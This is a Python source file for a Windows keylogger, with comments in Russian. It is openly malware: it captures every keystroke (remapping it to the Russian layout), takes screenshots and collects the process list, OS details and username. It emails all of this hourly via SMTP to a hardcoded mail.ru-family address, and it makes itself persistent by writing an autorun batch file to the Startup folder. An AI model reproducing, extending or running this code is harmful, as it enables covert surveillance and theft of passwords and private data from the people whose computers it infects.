import os
import threading
import getpass
import platform
from winreg import *
import datetime
import pynput.keyboard
import ctypes
import socket
import subprocess
from PIL import ImageGrab
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication


ru = ['й', 'ц', 'у', 'к', 'е', 'н', 'г', 'ш', 'щ', 'з', 'х','ъ', 'ф', 'ы', 'в', 'а',
    'п', 'р', 'о', 'л', 'д', 'ж', 'э', 'я', 'ч', 'с', 'м', 'и', 'т', 'ь', 'б', 'ю'
     ]

en = ['q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[',']', 'a', 's', 'd', 'f',
    'g', 'h', 'j', 'k', 'l', ';', "'", 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.'
     ]


class Keylogger:
    def __init__(self):
        # таймер sec
        self.interval = 3600
        self.email = 'web.security.20@bk.ru'
        self.password = '<script>you_pidor</script>'
        self.username = getpass.getuser()
        self.hostname = socket.gethostname()
        self.os_info = platform.platform()
        self.ip_config = self.check_task()
        self.log = 'Список процессов : \n' + self.ip_config + '\nОС : \n' + self.os_info + \
                   '\n\nПользователь/имя ПК : \n' + self.username + '/' + self.hostname
        self.key_array = ['<96>', '<97>', '<98>', '<99>', '<100>', '<101>',
            '<102>', '<103>', '<104>', '<105>'
            ]

    def catch_keyboard_layout(self):
        try:
            user32 = ctypes.WinDLL('user32', use_last_error=True)
            curr_window = user32.GetForegroundWindow()
            thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
            key_lang_id = user32.GetKeyboardLayout(thread_id)
            lang_id = key_lang_id & (2 ** 16 - 1)
            lang_id_hex = hex(lang_id)
            if lang_id_hex == '0x409':
                return 'EN'
            if lang_id_hex == '0x419':
                return 'RU'
        except:
            pass

    def append_to_log(self, string):
        self.log = self.log + string

    def logging(self, key):
        try:
            current_key = str(key.char)
            lang = self.catch_keyboard_layout()
            if key.char == None:
                current_key = '{}'.format(key)
                if current_key in self.key_array:
                    search_index = self.key_array.index(current_key)
                    current_key = str(search_index)
                    print(current_key)

            if lang == 'RU':
                for i in en:
                    if current_key == i:
                        current_key = ru[en.index(i)]

        except AttributeError:
            if key == key.space:
                current_key = ' '
            else:
                current_key = ' ' + str(key) + ' '
        self.append_to_log(current_key)

    def report(self):
        self.screen()
        self.send_mail(self.email, self.password, '\n\n' + self.log)
        self.log = ''
        os.remove('screen.jpg')
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        try:
            date = str(datetime.datetime.now())[:19]
            msg = MIMEMultipart()
            msg['Subject'] = 'Logged    ' + date
            msg['From'] = email
             
            part = MIMEText(message)
            msg.attach(part)
             
            part = MIMEApplication(open('screen.jpg', 'rb').read())
            part.add_header('Content-Disposition', 'attachment', filename='screen.jpg')
            msg.attach(part)

            server = smtplib.SMTP('smtp.mail.ru', 25)
            server.ehlo()
            server.starttls()
            server.login(email, password)
             
            server.sendmail(msg['From'], [email], msg.as_string())
        except:
            pass

    def screen(self):
        snapshot = ImageGrab.grab()
        save_path = os.path.dirname(os.path.realpath(__file__)) + r'\screen.jpg'
        snapshot.save(save_path)

    def check_task(self):
        command = 'tasklist'
        try:
            result = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
            return result.decode('cp866')
        except subprocess.CalledProcessError:
            pass

    def add_start_up(self, file_path=""):
        try:
            if file_path == "":
                file_path = os.path.dirname(os.path.realpath(__file__))
            bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % self.username
            with open(bat_path + '\\' + "autorun.bat", "w+") as bat_file:
                bat_file.write('@echo off\n' + 'cd %s\n' % file_path + 'start keylogger.exe\n' + 'exit')
            # Путь в реестре
            key_my = OpenKey(HKEY_CURRENT_USER,
                             r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
                             0, KEY_ALL_ACCESS)
        except:
            pass

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.logging)
        self.add_start_up()
        with keyboard_listener:
            # включить рассылку
            self.report()
            keyboard_listener.join()

if __name__ == '__main__':
    logger = Keylogger()
    logger.start()


